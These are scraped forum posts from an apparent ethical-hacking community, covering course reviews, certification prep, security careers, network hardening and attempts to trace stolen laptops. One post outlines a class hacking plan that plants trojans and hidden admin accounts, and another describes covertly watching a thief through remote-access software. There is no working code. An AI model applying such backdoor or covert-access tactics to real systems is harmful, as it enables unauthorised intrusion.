guide. again, mati does a great job explaining the different attack techniques and makes it all very understandable. i always say that if you have the power to make something difficult look easy, you truly master the skills. even though some subjects may need some updates, (for example, why is still bt3 recommended with the madwifi drivers?) it is still a great course to follow. since there are no real exercises in the course (except for trying everything yourself) i will skip this part and move right on to the exam, so stay tuned for the next update: exam time! exam time! [quote] the exam exists of multiple wep and wpa wireless networks that need to be hacked. there is a wordlist present for the wpa network(s), so do not worry about failing the exam because of a bad wordlist. the exam is more about how you got the result instead of the actual result. you have 4 hours to complete the exam and a total of 24 hours to send in the acquired results. they specifically ask for a workout of the steps taken and commands used which got you to your result. after this you will receive a reply with your results within a few workdays. different from the other courses, you will login using a ssh connection on a backtrack3 box where the wireless setup has been prepared. the host has two wireless devices hooked up, which gives you the decision to choose your favourite driverset (atheros or alfa). since i practised at home with the alfa my choice was obvious. saying this, there is really nothing more to tell about this course. i like the introduction chapters that give a better theoretical understanding of the wifi protocol. the big advantage of this course is that you will learn different attack methods to obtain the key which can be different depending on the state of the network (client/clientless, opn/ska etc.). i received a reply on my submitted documentation within 24 hours, which was extremely fast! since i owned all the networks i figured i would most certainly pass, but there is always that little piece of doubt. still when i got the results i was stoked i passed the course. thank you again for all the feedback i received and for taking the time to join me once again in this walkthrough. i hope you had as much fun reading it as i had writing it. thanks again to everyone for this great experience and the opportunity to tell others about my experiences within the security field. until next time.

1;Do SANS SEC617, Get Free MetaGeek Wi-Spy DBxriend of eh-net, josh wright, has a message, and we also have a really cool offer for anyone whos been thinking of doing his awesome wireless course. curious? see our review of  sans sec617: wireless ethical hacking, penetration testing, and defenses . hopefully this will also spark conversation on his wireless course and associated giac certification, gawn, in this eh-net forum board dedicated to it. let the conversation begin!! a message & special offer from sans instructor josh wright regarding wireless network security a couple months ago i saw some amazing wireless attack demos at shmoocon that took advantage of weak cryptography, weak authentication, and implementation and design flaws. the lesson i took away from the event was that wireless attacks have changed, but they arent slowing down.  we are seeing more and more tools to exploit wireless technologies, including wifi, bluetooth, zigbee, ieee 802.15.4, cellular networks, and proprietary systems.  if you want to protect your data and wireless networks it is critical that you understand the technology, threats, exploits, and defense techniques for wireless systems.  sans sec617: wireless ethical hacking, penetration testing, and defenses ( https://www.sans.org/info/71593 ) will help you gain that understanding.  keep reading if youd like to learn more about this course and how to get a  free metageek wi-spy dbx spectrum analyzer ($599 retail value) . as the author of sec617, i am continuously updating the course.  each update adds coverage of emerging attack tools and new trends, such as the ubertooth bluetooth attack hardware and the killerbee framework for exploiting zigbee networks.  even wifi networks, thought to be secure by many organizations, are now known to be susceptible to verisign-approved radius servers and a number of client-side exploits.  i also cover advanced techniques in sec617, such as "bridging the airgap" (leveraging remote windows vista/7 and os x compromised clients to exploit internal wireless networks). beginning april 19th ill be teaching  sec617 on vlive! , sans live, online training platform.  this is one of my favorite teaching methods; students receive all the benefits of a conference event (live instructor, live demos, lab exercises, detailed q&a), but the course is taught in smaller blocks, giving students more time to digest and process the material. students also receive recordings of each session that can be replayed to reinforce topics or catch up on a missed session.  the class will be meeting two evenings a week over a six week period.  you can register at  https://www.sans.org/info/71593 . as a special bonus for students in this class, sans vlive! is giving away a free wi-spy dbx ($599 retail value) to students who enter promo code wispy_eh!  i am very excited about this offer because metageeks wi-spy dbx gives you much-needed visibility into the behavior of the rf spectrum.  i use my wi-spy dbx for identifying unauthorized transmitters, interfering devices, and any number of attacks against the wireless network.  moreover, it is incredibly useful as a network troubleshooting and wlan design tool to help you optimize the configuration of aps at 2.4 and 5 ghz.  if you work with wireless networks, you should have a wi-spy dbx.   just remember to enter promo code wispy_eh when you register! if you or your organization uses wireless technology in any form, you will benefit from sec617: wireless ethical hacking, penetration testing, and defenses.  join me online starting april 19th and have fun while learning the tools and techniques for assessing, manipulating and exploiting wireless systems.   questions? feel free to drop me a note at  jwright@willhackforsushi.com .  thanks! josh wright do
3;Is my methodology correct or am I going about Penetration Testing all wrong?ou can ignore the following backstory, but i added it for dramatic effect.  im currently wrapping up  computer forensics course here at school. sadly we got stuck with a first year professor who doesnt know half of what she is talking about. she claims to have worked for a fortune 50 company doing their network security, but her knowledge level is laughable for the job she used to have held. students will commonly correct her on the basic facts about subjects, its almost offensive to my education. there are very few intelligent people in this class, its considered an easy minor, no wonder with professors like this, and a lot of criminal justice students latch onto it as well.  all of this being said,ive learned next to nothing from these computer forensics courses with her after a full year. so to cap off my year she decides to announce a live "computer hacking" competition of sorts. the major problem with this competition is the fact that there has  never  been any sort of lesson on network penetration or computer hacking in the general sense. the closest we got was a card trick that somehow simulated password cracking. all we know about the competition is the class will be split in 2 groups, one on defense and the other on offense.  i have no doubt there are only two people on the opposing team who could be potential threats but i am pretty confident i know more in this area.  this type of work is what id like to do for a career so im making this assignment into a test of sorts for myself. once again keep in mind we have been taught absolutely nothing involving network security or penetration testing. everything here is stuff that ive either been taught, picked up over the years or have convinced myself to believe is true. pick it apart, whats good, whats bad, whats flat out wrong.  the setting: pcs that barely boot. windows xp service pack 3 every machine was built using the same image, they all have very little added aside from some shithead forensic tools weve never used  were on our own network of about 15 machines the following are the software i plan on putting to use and my strategy for both defending and attacking.  defense: software: firewall - really have no idea here, havent used anything that was a specific "firewall" since zonealarm back in 2006, would really be interested to hear some recommendations for a firewall. anti-virus - microsoft security essentials, these pcs are pieces of shit and need all the resources they can hold on to and ive always liked this software. miscelaneous:  get all machines patched up to date, uninstall all unnecessary programs, shit like adobe reader/flash, msoffice, etc. remove all administrator accounts, basically try to leave as few things they could attack as possible. generate a strong windows password, wont do much for physical security but i assume itd help network-wise. lame as it is, bios passwords on all our machines, theyre padlocked so the jumpers cant be pulled.  offense: i cannot stress enough how little i formally know about this type of stuff, so please help me better myself. i think of it as a simple 4-part attack attempt  1. port scan, identify the targets and recognize their open ports 2. vulnerability scan, scan the target ips and discover known vulnerabilities the machines currently have. 3. attack, use metasploit to exploit the vulnerability and gain access to the users system.  4. keep control, installing a backdoor to keep control of the system  software: nmap - read a few books on the tool so i know a decent amount of what im doing with it, couldnt think of a better portscanner nessus - vulnerability scanner, again the most revered in its category i figured i couldnt go wrong, know little about the software though metasploit - ive been looking for a decent introduction to metasploit for a long time but havent had much luck. ive messed with it a little bit but would definitely like a thorough introduction from the start. i know metasploit is even considered to be script kiddy-esque but im not sure of a better starting point.  backup plan: i will have unmonitored access to this lab for hours at a time, and i highly doubt the other students would consider physical security of their machines or take advantage of us in the same way.  i had considered placing trojans on the pcs and adding them to the "ignored" section of the anti-virus, along with simply adding another administrator account and giving it remote desktop access. id rather have this as a back up plan because of how lame it is, but if times get tough this i will resort to 10th grade tactics.  im basically wondering if this is an accurate strategy to be going into this type of thing with? having you offer constructive criticism are things im looking for so please do. have another place you visit where i could post this story and get some knowledgeable feedback, send that my way too
0;Elearnsecurity BETA testing New Labslearn security online labs and challenges beta review i was lucky enough to be asked to join in with a small team of beta testers to experience firsthand the latest developments by elearnsecurity. the new online labs that are dedicated sandboxed cloud based environment for each student, accessible from the main learning material interface/portal. on the 29 march 2011 at 8pm gmt; i eagerly await access to get a look at the concepts and ideas that up to then had only read about in discussions and suggestions by armando in the forums.  the whole process i should add came off the back of consultation with the existing student community, so good to see a provider listening to the demands of the customer.  reading the text in the forums, i could tell that armando was excited about this project as it would bring yet another perspective to the learning model on offer from elearnsecurity and ultimately would enhance the learner’s experience. my experience i would have to say lived up to anticipated hype! perhaps partly due to having another chance to log in with equal minded  folks keen to get their hands on the latest information and experience they could.  i need to mention, matugm who pretty much pwnd it before we really got off and running, last time i seen him posting he was trying to get a shell! 4 hours flashed passed in a blink of an eye. roughly about 30 mins after the agreed meet up time; we were off and running. the only real reason for this late start in my mind was due to getting some testers initial technical issues resolved and giving us group instruction via text based chat. (a head ache i would imagine if you’re on the supporting side) the test itself involved what appeared to be at the outset a simple enough challenge for anyone who has experience in this field or perhaps has recently studied a course like ecppt.  though as we attacked the challenge set out in front of us, i started to realise how this setup could give me an advantage to expand my inner working knowledge of both sqli and of the popular tool sqlmap. most of what i have read or the guides i have seen up to now focus in on get method via url vulnerable parameters. i struggled to see many discussions around other input channels or post method choices while studying for ecppt.  this challenge was exactly what i wanted to see, exactly what i wanted to try out and lucky for me gave me a chance to yet again apply what i had learnt up to know. having developed new skills you are keen to try to keep them sharp, in hacking as we know only really achievable if you have labs if you want to stay on the side of the good. as well as the actual objective of retrieving information from a database and inserting data into a database, i found i was starting to think “you know what i am going to try this from different angles from the point of view of learning more about the use of sqlmap, from a burp log, from config file and straight off the cli”.  giving me a chance to work with the tool in the different ways i wanted, so i could feel i was making progress towards being comfortable with the options that up to now i had really only read from the manual. i collected a whole bunch of data that i plan to look at from the tool and study/research a bit further to understand as much as i can from the sql used and look to ways to refine  and focus my attacks.  all of this from a single login page, i could hardly believe it, now i was wishing i had more time and energy left in me to keep chatting and testing with some very experienced specialists in the field. alas work beckoned in the morning and the lure of sleep forced me to concede, well at least to go to bed and leave my laptop cracking the hashes i had obtained from the dump (not actually an objective but fun none the less, there was talk of removing this as i don’t think it was intended but i suggest leave it in) as far as other enhancements are concerned; my understanding is there is a plan to have more exercises with step by step walkthrough examples to get those needing extra assistance off the ground, which in turn will help them pass the cert/gain skills. more challenges are to be released to keep the more experienced students coming back for more; this in turn should in my view build on what is already showing signs of growing as a community. the challenges do come with hints, but i know from chat with armando and the team that these hints will affect the participants scores and plans of giving away goodies for challenge winners will probably keep the hardcore away from these but still give others at least a good learning tool until they build up their skills and experience. details of the goodies and prices for access have yet to be disclosed.  in my humble view a good addition to give us who are interested in researching security the hands on approach that is needed to close in on a sector that needs more good guys/gals on side
1;SCADA / cyber security adviceood morning, i am seeking a bit of advice from a career / education perspective. im a process control engineer, working at a public utility. i work in scada systems, plcs, and dcss (distributed control systems). sorry for all the acronyms, but i figure you folks are used to them, with all the certs floating around out there. i am very interested in focusing my career on the scada / cyber security side of things. my background is in chemical engineering, not it, however; and right now, i sort of feel like im trying to take a sip of water from a fire hose.  with my work experience in scada systems, ive had to tinker around in domain controllers, firewalls, dmzs, dcom, sql, etc... i know just enough to be able to troubleshoot some minor problems, but by no means am i an expert. i definitely cant explain the "whys" at this point. so ive decided to apply to a masters program in information security. i want to focus on the scada side of things, and how they are segregated from business networks. the protocols i typically work with would be tcp/ip and modbus / modbus+. and opc (is that a protocol? see, ive got so much to learn...). there are four pre-requisites required before acceptance into the program that i am interested in. ill be taking these, starting in the fall. they are: fall semester: 1) discrete / logical structures; 2) java programming spring semester: 3) computer org / assembly; 4) program design & data structures so those are the official requirements, but given my non-it background, i feel that i ought to beef up a bit more before actually entering the program. thats really where im seeking advice, and with that in mind, im considering the following: currently, im doing "independent study" of the network+ exam. i am not sure whether ill actually take the cert, but it is definitely providing me with good foundations, so im going to cover all of the material. i plan to take a c++ course over the summer, based on the recommendation of a friend that is in a computer forensics program at the university ill be attending. while im taking care of the infosec pre-reqs, i was thinking i might enroll roll in a cisco network academy on the side, and try to get a ccna. (my supervisor at work is thinking about building ccnp into one of our career ladders. i explained to him that ccna comes before ccnp.) after i started the info sec program, i think that id continue to take some courses on the side... c sql ...? im also on the market for a laptop that would get me through the program. ive noticed that a lot of the students are using macbook pros. i have a macbook myself, but i was surprised to see so many students using the mac osx as opposed to windows. could anyone offer me some insight as to why this might be the case? my crypto friend recommended a macbook pro, with vmware installed so that i could install a virtual machine of a windows os as needed... any recommendations as to which os id want -- xp, vista, or 7? ive also seen a lot of discussions here about linux / unix. would i want to install that in vmware, as well? i do have a --little-- bit of experience in ubuntu, from setting up a tikiwiki server for my former employer. i am by no means an expert. finally, if anyone has a similar background in scada, id love to develop a relationship with a mentor. (would that make me a mentoree or mentee? im not clear on the proper term here.) kind regard
1;Stolen Macbook Pro from College Campusi guys, so my macbook pro (2010) was recently stolen from my apartment about a week ago, and i am looking for some help to possible track it. i have contacted the authorities, but they are pretty much useless. i do not have any gps or theft programs unfortunately, but the it center at my school was able to provide my mac address and i also still have the receipt from the computer with all of that information. i have contacted the schools around mine and have them on the lookout for their networks. i didnt know if there was anything else i could do. i am not a computer person but from reading other posts....i do have a gmail account, itunes, and i have synced/used bluetooth with my android phone (i have a tmobile mytouch 4g as a sidenote). i dont know if any of that could be of use to somehow locate my mac....any help would be appreciated. i lost so much work and personal data....im pulling for straws at this point since it will take me awhile to get the money to buy a new one..i will be trying to do anything i can to try and track it.  as a background note....my mac was taken when we had a bunch of people over at my apartment. given that most of the people who attended were friends (or so i thought)...i do have emails and information on most of them. although my computer could have been taken at any point in the night, there was a time when i drove a friend home and when i went to my room to get my keys i forgot to lock my door (yes cue comments on my stupidity).....with that there were only about 6 people left at my place when this occurs, which leads me to narrow down who could have stolen my computer, since my door was locked for the majority of the night. i am also here to believe that they took it to sell/use since my printer cord (which was plugged into my printer) was found stuffed underneath my couch cushion...so they may have thought it was my charger, which was elsewhere in my room. just the fact that i knew everyone at my apartment just makes it worse that i know the person who took my computer....even if i never see it again, i would just want any clues about finding out who did this
1;Whitelisting the networkot sure where this fits since its not just about malware or firewalls.  anyway i just finished about a 3 month project to get my organization (that ive been at for 6 months or so) caught up on years of back patching.  unfortunately the isos words of wisdom consisted of "install all patches because they are old"  regardless of whether or not the patch was deemed critical by ms or whether they had posed any risk to the organization.  "even this dvd/cd no-autorun patch for our servers that no one can get physical access too and we dont frequently load media in..."  "yes because its old..."  but i digress... so while waiting for all those patches to load, i did a lot of twitter reading and found that a number of pros have been recommending that we truly learn our network and what is running on it to better protect it.  i mean its a simple enough concept, one would think you should know this anyway.  unfortunately when a network is built in spurts to accomplish a large increase in demands for resources, some things get pushed aside, mainly documentation.  this is what i walked into 6 months ago.  in that 6 months i had a full inventory of both servers and workstations, documentation on the functions of all the servers.  that lead to me being able to decom a bunch of systems.  awesome when you ask someone what this does and they stare at you blankly (and theyve been there for years).  so, we turn it off and see what breaks!    there i go again so back on track... so whitelisting, awesome concept, i am currently working on a plan to implement this concept little by little.  i have been setting up the av policies to utilize the ids/ips features to whitelist applications and prevent certain directories from being written to, that should cut down on instances of fake av, which are rare but do happen based on the nature of user profiles.  i am also in the process of getting data for implementing egress on our firewalls.  the next big chunk will be to actually utilize the nice expensive switches and really segment the network, not just block it off for organizational purposes. so the reason i am posting, i am curious to see if others are taking the advice and beginning to implement similar plans, or if you have already done so.  id be interesting in getting some feedback and even any difficulties you may have had with certain parts of the implementation.  also how did you get management to buy into it?  the team lead in our department has been trying to get nac implemented but it keeps getting cut and hes also been trying to secure the vlans better but keeps getting pulled to do other projects.  the management doesnt seem to get that all the patching in the world isnt going to protect you from a determined party and that we should be spending more energy at know what belongs on our network than blindly securing systems. sorry if this was long, but sometimes the mind shoots into overdrive. i look forward to your comments!
3;Preparing for the OSCP exam (again)ey guys, so ive been preparing for the oscp exam again. its been a while ago since i failed it. also havent been doing any security related work/studies for a long time until recently. the past 2 weeks ive been working on the de-ice disks and pwnos. ive just penetrated the last machine today (finally).  ive been going over the course materials again and watching the videos. the problem is, im not learning anything new, and i dont feel ready for re-taking the exam. i mainly have issues with time management and spending too much time going the wrong direction (especially on the exam). i understand all the materials so that isnt a problem. im concerned that when im retaking the exam ill try to spend too much time on a service that seems vulnerable at first, but isnt the way to penetrate the box. anyone knows how i can practice some more? im thinking about downloading old programs with known exploits and try to attack those installed on a vm. i want my oscp title lol
1;Trackingdown via Wardrivingi, as you can tell him new here. im pretty sure this is the forum i should put this in.  so i started searching google for help and this forum kept poping up over and over and looked like the perfect place to go because i wasnt getting very far in getting my question answered.  my friends laptop was stolen. he has all the guys personal information, name age which highschool he went to, what his external ip is ect. (he has logmein on the computer) problem is the guy turns the laptop off when hes not using it. so my friend sits there everyday and watching him on the laptop trying to find a moment to grab the laptop and use it real quick. its a win7 machine with some antivirus. he moused over the network icon and saw he was attached to linksys. which is a bummer through tracing his external ip we know the neighborhood, and planned on going wardriving to hunt for the ssid, but with it being linksys were gonna get a few results.  now i know that using netsh in win7 you can do something like a show wlan /all and get the mac address for the wireless network so we can pinpoint it. but as well. but with it possibly being an old linksys do you guys know if maybe i could do something to like get the netbios against the internet address to get the mac that way. as a moment of time to type commands on the laptop hasnt presented its self? thank you very much apologies if ive put this in the wrong category
1;Networking Questionhave been searching for hours with not too much in the way of luck. what i am trying to do is set up my home network to be a bit more secure and i figure i could do this is i had a second subnet for wireless, for boxes not needing internet access, such as vulnerable test systems. however i have 1 router which i beleive is a linksys wrt54g (im currently at work so i cant be 100% sure right now) . this router has stock firmware that has been updated. i had this idea while at work this evening and thought to research it. i have been hit and miss with information however. i thought i had my answer within the dd-wrt site but i think i was off by a long shot when i realized that method required 2 routers. is there a way that anyone knows of to have 2 subnets with one router. what im trying to figure out. wired lan - subnet 1 wireless lan - subnet 2 thank you in advance for any answer whether it be yes or know. when i get home i will poke around in the setting to see what i can find out as well
3;[Article]-Course Review: The Hacker Academy Online Curriculumeems like weve been doing a lot of course reviews. we see a number of questions in our forums about training in all of its forms and how best to spend your own or your companys money. hope this kind of content helps. with this in mind, heres a deeper look into the online training offered by the hacker academy. many thanks to tony for the time and effort. as always, let us know what you think of not only the review but also the training. [article]-course review: the hacker academy online curriculum review by  tony l turner cissp, cisa, giacx4, opse, vcp, itil-f   the hacker academy (tha) , with their online ethical hacking curriculum, fulfills an integral training need for security professionals. there are many training programs available today that teach tools and techniques for hacking. some are better than others or suited to slightly different specializations such as web, network or wireless pen testing, but most of them are presenting very similar content. the problem is that most of these programs offer static content. by that i mean that the material does not change frequently, and the student is forced to find ways to stay current on new techniques. i think most of us would agree that it is a requirement in this field, but it can be very expensive and time consuming constantly going to conferences, trying to sift through twitter or the hundreds of blogs for that useful tidbit. tha seeks to address that very problem with constant updates to the content by adding modules at an alarming rate. the cost is very reasonable at $95/month or $995/year with no contract required. the format of the course includes web-based videos of the content, a lab component for each module, additional reading from external sources, comments sections for the module to interact with other students and instructors, and virtual machines for the attack platform using backtrack 4 and various target vms.â  instructors are real-world professionals such as  eh-net columnist mike murray , mike bailey, daniel frye and jeremy conway. thaâs online curriculum consists of two primary sections, ethical hacking and the cutting edge.  do

0;Another Pentest Lab Thread--with a twist? // intro threadello everybody!! i am new here, obviously.  i am hoping that i am not going to be posting your typical n00b questions. about me? well, i am 23 years old student from the us.  i cant find a decent hacking forum anywhere that doesnt have malicious/skid motivations. ive always been into computers.  i went through the phase of being malicious/skid back in the middle school days with aol, aim, "nukers," "punters," (if anybody remembers those good ol tools lol). anyway, i am now finally majoring in it (used to be a psych major, read a study once about monkeys not liking their hobby when they started getting paid for it and i liked computers too much, i wouldnt get a degree in it) and i am focusing on security.  after my script kiddie days, i gave up on the hacking scene (obviously, those tools rarely worked) then i would come back here and there. now, i am serious again and with a new agenda. i want to learn. learn it all, how it works, why it works, and i want to secure things. i would love to make this my career.  their are not many feelings that feel better than "solving the puzzle" and gaining access/getting the password (i did a lot of the lessons on hackthissite!).   my question is this.  i have a friend at school that i have interested in hacking.  i believe that his intentions are good and he isnt trying to do damage, he is just fascinated by it all. well, i am brainstorming ways to set up a pentest lab for us.  i see a lot about vmware and what not, which is all good, but, we want to be able to attack the network from the outside.   for example, if he is at home and wants to do some work, he can, or, were both at school and want to work on it, we can. i do not, however, want to make my entire network vulnerable. my idea was to set up a network of vulnerable isos (hackerdemia, de-ice, dvl, metasploitable, etc) where (i think only virtualbox supports it) only the vms can talk to one another. then, set up backtrack as its own ip on the network so we could ssh into that then use the bt vm to attack the toher vms.  i do not know how i would go about setting this up though. or if there are maybe better ideas? what would be best is a way to attack the box directly from our laptops, however, like i said, i fear making my entire network vulnerable. my router has an option to isolate everything on the network from one another, however, that ruins the file server setup my girlfriend and i have.   i guess i am basically just looking for any alternate ideas that i may not have thought of. so to summarize: a friend and i would like to attack a computer on my network (preferably w/ our own os, he runs blackbuntu, i have arch w/ preferred tools) but i do not want to make the entire network vulnerable (what are the chances of someone actually hacking my network though unless i was out looking for trouble??)  ssh into a backtrack vm (or even backtrack as the host os) and attacking the vms would work also. anybody wanna help?? =)    thank you in advance, ill check back soon after i surf the forums some more =
3;The Hacker Academy review (short version)want to share my experience with you guys.. the first module is "hacking fundamentals" which as you can tell is going to be a basic overview. i initially thought to skip this section because i already knew the basics about the career, certs, blah blah..but i decided to watch the videos and i am glad i did. yes i knew 90% of what was on the videos but the 10% i didnt know made it worth while. it was about hackers who have made the news and others interesting things about getting into the field (plus the videos are anywhere from 5-20 mins, why not watch everyone?) along with every video is a lab, and they are actually pretty solid (i thought i was going to skip most of them and just watch the videos, but i have learned alot more through the labs). the labs for the 1st module are a little light and blah, but its a section about the very very basics..what do you expect? module #2: reconnaissance this module was all about gathering information you could find on the internet about your victim.     looking up locations, servers, employees, physical and logical addresses     finding detailed information about the victims servers     learning how to use google the right way and getting better search results the tools you will use in this module include but not limited too: whois, arin, google, bing, yahoo, dig(unix/linux), nslookup(linux/unix), foca, maltego. i have never tried pentesting before so i really liked this section..researching about a company and trying to find flaws through documents was pretty fun i completed 6 of the 8 sections in the network penetration module. this is when i started to have  mixed feelings about tha. so heres how it works..theres a video between 5-30ish minutes, sometimes the video explains the material pretty well and sometimes..mm not so well. a couple videos made me wonder "why did they even make this video?". there are also a couple videos where they begin saying "we debated about even making a video about this section but we went ahead and made it anyways"..then the video is like 4-5 mins long and doesnt really give any information. after the videos are over, the instructor tells you to complete the lab. during some of the labs, you can get confused or maybe you dont even know what the hell is going on because the video didnt really help and the lab instructions were a little shallow. when you listen to one of the first videos, they do state "we are not here to hold your hand"..and the mean it. ive never used most of these tools before and sometimes i can get lost in the lab..so i end up googling, watching youtube videos, and security tube. after doing my own research, i realized there are so many videos out there for free and that will walk you step by step through each and every tool. so im beginning to watch these other videos and putting tha on the back burner. i dont want people to think im bashing tha because i really like their set-up but i wish they would "hold you hand" a little bit more. some people may say, oh you can just email them if you have questions..and to that i say....if youre doing the module right now, i wouldnt want to stop and wait 24-48 hrs before i can continue. after i got a little frustarted with the course, i started to look at random modules and see what they had to offer. i really wish they gave more information in their videos.. from what i have seen so far, i would say if you are beginning in pentesting and have never used backtrack or most of the pentesting tools...i dont know if you would like tha as much as someone who has a little bit more experience with the platform and tools. beginners would be best off buying backtrack 4(book), metasploit, and other pentesting books...read the chapters and once you get to a tool or concept you dont know...just google and watch videos about the concept or tool. its been working really well for me the past couple of days. especially if you want to learn asm or metasploit, check out welcome to securitytube!. the founder has a whole course about both of them
3;My Journey from PC enginner to Junior Pen tester  NEWBI SHOULD READi all, so most of you have seen me on this forum a while now and some might know that about a month ago i landed my dream job as junior security consultant. i decided to write a small bit about how i got the job in a hope some people who trying to break into the industry might find it useful. also for any of you who dont know me that well, writing is not something i really enjoy that much and this still in draft so any feedback is more than welcome. its a bit long but i hope it will be useful to newbi trying break into security. i hope to also get this on my website and the ypisg website once it has been read a few more times. so you could say this eh exclusive lol how i went from pc technician to junior security consultant at the longest running computer security company in the uk. as a young boy i was also the curious type wanting to know how things worked and why my toys could not do stuff i wanted them to. i always found time to take my toys apart then try and put them back together again which didn’t go as well as i expected. there was always something about me that wanted to know everything about anything i could. at first this started with toys but as i got older this moved onto computers. when i was about nine we got our first computer, which was a time pc and came with games like theme hospital. i was never really good at the hardware side of things so i focused mainly on software, learning how to do most things from the keyboard. as i went to secondary school i learned more and more about different software and this was where i made my first hack with some friend, we noticed it was possible to use excel macros to install software we should not really be able to have like virtual pool and football manager. at the same time films like hackers was coming out and i remember watching that film thinking ‘wow that is so cool how does that work’ this was the turning point in my life where i just wanted to know about hacking and how i could learn more about it.  however at this time security and hacking was not the focal point that it is today so trying to learn hacking was near impossible. from this point on hacking became my hobby i would read about stores in the news and try find out as much about hacking as i could in my own spare time. i was still really unsure what i wanted to do with my life but knew i didn’t really enjoy school that much i only really liked doing it which was really hands on, so i decide to leave school and being young felt i would walk into an amazing job with great pay and my life would be complete. after leaving school, through the years i had many jobs including working for a film company, courier, and a printer. whilst i was doing all these jobs i carried on trying to learn about security and hacking buying items off ebay that were described as hacking courses to try and teach myself and learn more. i finally came to the decision that the only want to go forward would be to do a computer course so i applied for a course at my local collage i was still unsure what i wanted to do so i tried to pick a course that covered a wide range of subjects, maybe this would give me a better indication of what i really wanted to do. i ended up doing hnd in information technology and was given the chance to do a top up degree with the university of kent to get a degree in information technology. while doing my degree i started a part time job as sales advisor at pc world, within a few months i had worked my way up to becoming a tech guy. it was also around this time that security became well known to people through the news. i spent most of my student loan on computer security books but was frustrated that i never had time to read them. i finally finished the degree and achieved a 2.2 grade this was not the best outcome but i had some personal problems during the last year which affected my grade. so i left university and was still unsure of what i wanted to do at the time, i was still following my hobby of security reading about recent hacks in the news and trying to find out what i needed to know in order to become a security professional. i carried on working part time at pc world why i figured out what my next move was. at first i started to apply for web development jobs just to have full time work but didn’t feel like my heart was really in it and didn’t want a job where i could learn everything, i wanted it to be a challenge. i wanted a job that was exciting and was always demanding.  i finally got a bit of a break when browsing the bcs website i saw an advent that went something like ‘do you want a career in computer security get on contact’. this caught my attention and i wanted to know more, i never really used the bcs at all before so i decided to send them an email and find out what the advent was all about. i later got a reply and was told they were setting up a group, which would help young professionals get into security. this would be the start of my eight-month journey to land my dream job as a pen tester. i joined the group and started to get involved a lot more with security. i found online forums like ethicalhacker.net where i could get advice on course and books, i wanted to give me the best chance to get a job i already knew how hard this was going to be as most companies would see my 2.2 grade and usually decide that i was not capable of doing this job.  however i didn’t let that stop me i knew i wanted this more than anything in the world, a job that was well paid challenging and was always demanding.i started to realise what a challenge it was going to be with so much information to learn, so many courses to do and realising how expensive it would be. i didn’t really know where to start i thought the best thing would be to try get some security experience so i tried to find some courses and came across the hackingdojo run by tom whilem. i knew tom as i had read a few of his books and this course was aimed at taking someone with no experience and building them up, this course was a pay monthly course, so it was affordable on my part time wages. the only problem i had was this course was run once a week so i had a lot time on my hands so i tried looking for another course that i could afford but also would give me something to add to my cv, the only other course i could really afford was the ocwp (offensive security wireless professional) i knew about offensive because of the wonderful work they did with backtrack also lots of people recommended it to me on ethicalhacker.net.  once i passed the course i tried to get my name out into the industry as best i could i attended security events, creating a linkin page and adding contact as well as security groups and created my own webpage  www.jamierougive.co.uk  to have something to show employees as well as help others who were like me and didn’t really know where to start. i also got cheap business cards printed with my website on that i could hand out to places like infosec. after around five months of doing this, making contacts and working hard to try to improve my skills as well as being involved with the ypisg.bcs.org and running events i started to apply for junior penetration jobs. i was happy when i started to get requests to go for interviews i felt that i was getting somewhere after all my hard work was starting to pay off and it should have not been long before i was working for a company doing something i was really interested in and had a lot of passion for.  how wrong i was, i was getting interviews but was having problems with the questions they asked me this was because the range of question were so broad and different from one company to another a lot of the time i would learn the basic stuff and then they would want me to explain advanced stuff that i could just not remember. i was trying to remember too much and remembering it inside out was even harder. when i did learn the more advanced stuff i would get asked the really basic stuff it was really frustrating it felt like i was going backwards and not getting anywhere and despite the fact i knew once i was given a change i could learn anything and would be a good pen tester getting a break was proving extremely difficult. just when i felt things could not get any worse, they did i had the worst interview of my life where nothing went well and the person who interviewed me made me feel extremely stupid and like no matter how much i tried i would never get a job doing what i wanted i left the interview felling demoralised and really down and just felt like giving up.  it took me a few days and some really good advice to pick myself up and get ready for another interview i had lined up. the final interview i picked myself up and took everything that went wrong in other interview and built on it spending the four days before the interview going over the ceh study guide and other notes as well as looking at the company website trying take in as much information as i could this was make or break for me i gave it everything i could, i turned up at the company not knowing what to expect were they going to ask me basic questions or were they going to ask me about wep cracking.  i always turn up early for interviews and ended up sitting in the reception for around fifteen minutes before i had my interview and straight away i could tell i was going to like this company the staff were friendly, they were working hard but having a joke at the same time i felt at home and felt really relaxed. i was then called for the interview where i got mixture of questions some was basic but some were more advanced. i had question after question, some i just didn’t know, and from experience knew it was best to be honest the people who held the interviews knew their stuff inside out it’s not worth trying to blag it. it felt like i was in the interview a lifetime two and half hour to be precise, another thing i had found with interviews is you can never really tell how it went, there are some cases where you can tell like the really bad experience i had, i knew that went bad and knew once i left i had more chance of winning the lottery than getting that job. but some you just cannot tell, i felt this interview went okay but some questions i didn’t know or didn’t answer i felt let me down, which made it even worse was the interview was on a thursday and i had to wait over the weekend to find out how it went. i finally got the good news that they wanted to take me on as a junior security consultant, i can’t really describe how this felt i was over the moon at the news and at a total loss for words. i just couldn’t wait to start my new job. so what did i learn from all this? what was the point of this article? well i wanted to share my journey and give some advice to anyone who is trying to get into security especially pen testing. the first bit of advice is it’s not going to be easy so you need to want this so bad and never accept no as a answer if you really want this it does not matter what background you have what grades you got at university, if you want this you can get it but be prepared to work hard and realise you may have bad interviews but if you build on them you will finally reach your goal. you should also do as much as you can to get involved within the security field going to events and making contacts could give you the vital break you need i got some of my interviews from contacts i had met at places like infosec and the bcs.  try and pay for your own course if you can, this shows you are truly interested in the subject and are willing to spend your own money for something you’ll enjoy and believe in. if you can afford it doing something like tiger scheme ast and qstm course, which will get your cv, noticed by companies or the crest crt course will improves your chances of landing a job. i also recommend going thought ceh to understand the basic as well as leaning stuff like common port number, how tcp/ip works, how nmap uses tcp|udp to determine whether a host is open close or filtered, and knowing some web hacking basic like what is sql injection and xss. also know your cv inside out, you’ll usually be interviewed by technical directors if you have on your cv that you passed cisco course, be expected for them to ask you a cisco question like what is the default password for cisco router. the last bit advice is just chase the dream never give up it will be hard to land a job but once you do it will be worth it

